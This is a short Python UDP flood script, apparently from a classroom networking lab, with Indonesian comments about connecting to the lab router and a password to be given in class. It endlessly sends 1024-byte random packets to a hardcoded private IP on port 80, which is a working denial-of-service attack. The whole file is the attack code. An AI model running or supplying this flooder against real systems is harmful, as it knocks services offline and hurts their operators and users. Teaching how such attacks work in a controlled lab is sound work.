import socket
import random

target_ip = "10.113.204.149" #pastiin udh terkoneksi sm router nya dlu yaa 
target_port = 80             #untuk passwordnya bakal dikasi tau dikelas

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

while True:
    sock.sendto(bytes, (target_ip, target_port))
    print(f"Sent packet to {target_ip}:{target_port}")
